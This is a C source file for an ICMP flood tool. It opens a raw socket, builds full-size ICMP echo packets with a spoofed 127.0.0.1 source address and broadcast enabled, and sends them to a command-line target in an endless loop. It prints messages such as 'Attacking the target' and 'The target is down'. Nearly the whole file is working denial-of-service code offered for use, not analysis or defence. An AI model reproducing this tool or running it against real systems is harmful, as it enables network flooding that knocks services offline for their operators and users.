#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <assert.h>

#include <netinet/in.h>

#include <sys/socket.h>

// packet
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

#include <arpa/inet.h>

// signal handler
#include <signal.h>

// close syscall wrapper
#include <unistd.h>

/* nanosleep function
#include <time.h>
*/

// error handler
#include <errno.h>

static int socket_fd = -1;
static unsigned char *packet = NULL;

static void interrupt(int signal)
{
    (void)signal;
    puts("Cleaning everything before exit");
    if (packet != NULL)
        free(packet);

    if (socket_fd != -1)
        close(socket_fd);
    
    exit(0);
}

/* Copied from: https://github.com/mtcp-stack/mtcp/blob/master/mtcp/src/icmp.c */
static uint16_t
ICMPChecksum(uint16_t *restrict icmph, int len)
{
	assert(len >= 0);
	
	uint32_t sum = 0;
	uint16_t odd_byte;
	
	while (len > 1)
    {
		sum += *icmph++;
		len -= 2;
	}
	
	if (len == 1)
    {
		*(uint8_t*)(&odd_byte) = * (uint8_t*)icmph;
		sum += odd_byte;
	}
	
	sum =  (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	const uint16_t ret = ~sum;
	
	return ret; 
}

int main(int argc, char **argv)
{
    (void)argc;

    if (!argv[1])
        return puts("A target is need");
    
    static struct sigaction ctrl_c_int = {
        .sa_handler = interrupt,
    };
    sigemptyset( &ctrl_c_int.sa_mask );
    ctrl_c_int.sa_flags = SA_RESETHAND;
    /* Setting the signal SIGINT a non-default action */
    sigaction(SIGINT, &ctrl_c_int, NULL);
    
    char *target = argv[1];
    char *destination = NULL;
    /*
    char *port_str;
    */

    if (strcmp(target, "localhost") == 0)
        destination = "127.0.0.1";
    else
        destination = target;


    /*
    if ((port_str = strstr(target, ":")))
        if (strncmp(target, "localhost", port_str - target) == 0)
            destination = "127.0.0.1";
    if (port_str == NULL)
        return printf("Target %s doesn't have a port number\n", target);
    */

    /*
    char *bak;
    if (destination == NULL)
        destination = strtok_r(target, ":", &bak);
    else
        (void)strtok_r(target, ":", &bak);
    */  
    
    /*
    int port = (int)strtoul(strtok_r(NULL, ":", &bak), NULL, 10);
    if (port < 1 || port > 65535)
        return printf("Invalid port number %s\n", port);

    printf("Attacking port %d of address %s\n", port, destination);
    */

    struct sockaddr_in dest_sock;
    socket_fd = socket(AF_INET, SOCK_RAW /* It's need for send a raw Internet packet from a socket interface */, IPPROTO_RAW);
    if (socket_fd == -1)
        return printf("Can't create the destination socket: %s\n", strerror(errno));
    printf("Socket Descriptor: %d\n", socket_fd);
    int on = 1;
	if (setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, (const char*)&on, sizeof(on)) == -1) {
		perror("setsockopt");
		return (0);
	}
	if (setsockopt(socket_fd, SOL_SOCKET, SO_BROADCAST, (const char*)&on, sizeof(on)) == -1) {
		perror("setsockopt");
		return (0);
	}
    dest_sock.sin_family = AF_INET;

    memset(&dest_sock.sin_zero, 0, sizeof(dest_sock.sin_zero));
    unsigned long dest_addr = inet_addr(destination);
    unsigned long src_addr = inet_addr("127.0.0.1");
    
    inet_aton(destination, &dest_sock.sin_addr);
    
    /*
    dest_sock.sin_port = htons(port);
    */

    if (connect(socket_fd, (struct sockaddr*)&dest_sock, sizeof(dest_sock)) != 0)
        puts("Connection not established");
    else
        puts("Connection established");

    printf("Attacking the target %s\n", destination);
    /* static const struct timespec req = {.tv_sec = 0, .tv_nsec = 1000}; */

     /* The size of the payload is formed by the IP packet header + ICMP header + cookie size */
    static const unsigned int cookiesize = 1500 /* We are work on (Ethernet) link layer */ - (sizeof(struct iphdr) + sizeof(struct icmphdr));
    printf("Cookie size: %u\n", cookiesize);
    static const unsigned int packet_buffer_size = sizeof(struct iphdr) + sizeof(struct icmphdr) + cookiesize;
    
    printf("Malicious packet size: %u bytes\n", packet_buffer_size);

    packet = calloc(sizeof(unsigned char), packet_buffer_size);
    if (packet == NULL)
        return puts("Can't allocate the packet buffer");
    puts("Memory allocated for the internet packet data");

    struct iphdr *ip = (struct iphdr*)packet;
    struct icmphdr *icmp = (struct icmphdr*)(packet + sizeof(struct iphdr));
    /* Zero out the packet buffer */
    memset(packet, 0, packet_buffer_size);

    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(packet_buffer_size);
    ip->id = rand();
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_ICMP;
    /* Setting the source and destination address of the IP packet */
    ip->saddr = src_addr;
    ip->daddr = dest_addr;

    icmp->type = ICMP_ECHO;
	icmp->code = 0;
  	icmp->un.echo.sequence = rand();
  	icmp->un.echo.id = rand();
	icmp->checksum = 0;

    printf("Packet Structure\n[Header]\nVersion: 0x%x\nIHL: 0x%x\nTOS: 0x%x\nTotal length: 0x%hx\nID: 0x%x\nFragment offset: 0x%x\nTTL: 0x%x\nProtocol: 0x%x\nHeader checksum: 0x%x (will be filled later)\nSource: 0x%x\nDestination: 0x%x\n",
        ip->version, ip->ihl, ip->tos, ip->tot_len, ip->id, ip->frag_off, ip->ttl, ip->protocol, icmp->checksum, ip->saddr, ip->daddr);

    errno = 0;

    for (;;) {
        /* Randomize the cookie data */
        memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), rand() % 255, cookiesize);
        /* Calculate the hash of the information modified by the memset call */
        icmp->checksum = ICMPChecksum((uint16_t*)icmp, sizeof(struct icmphdr) + cookiesize);

        int r_send = sendto(socket_fd, packet, packet_buffer_size, 0, (struct sockaddr*)&dest_sock, sizeof(dest_sock));
        if(r_send == -1) {
            if (errno == 0)
                puts("The target is down");
            else
                printf("Error: %s\n", strerror(errno));
            break;
        }
        else ; 
    }

    raise(SIGINT);

    return 0;
}


